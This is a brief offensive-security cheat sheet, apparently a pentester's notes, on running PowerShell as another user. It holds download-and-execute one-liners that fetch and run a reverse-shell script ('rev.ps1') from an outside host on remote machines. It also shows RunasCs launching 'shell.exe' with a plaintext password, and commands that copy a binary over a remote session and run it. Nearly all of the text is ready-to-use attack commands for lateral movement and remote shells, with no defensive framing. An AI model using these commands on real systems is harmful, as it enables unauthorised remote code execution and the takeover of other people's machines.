## run powershell commands as another user

### with SecureString credential
```powershell
$pass = ConvertTo-SecureString 'password123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('.\user', $pass)
hostname
invoke-command -Computer ComputerHostname -Credential $cred -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://192.168.1.69/rev.ps1') }
```
change ComputerHostname.
`-ConfigurationName ...` parameter might be required to run commands for special restricted user permissions

### with RunasCs
https://github.com/antonioCoco/RunasCs
available as a powershell script or a C# program in the releases.
The C# program works even if windows remote management is disabled.
```dos
runascs Username Password C:\path\to\file\shell.exe
```

### on remote machine with impersonated token
```powershell
$sess = New-PSSession -computer ComputerHostname
# reverse powershell
Invoke-Command -Session $sess -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://192.168.1.69/rev.ps1') }
```

#### copy and run file over session
```powershell
Copy-Item "c:\path\to\file.exe" -Destination "C:\users\public\" -ToSession $sess
Invoke-Command -Session $sess -ScriptBlock { "C:\users\public\file.exe"  }
```

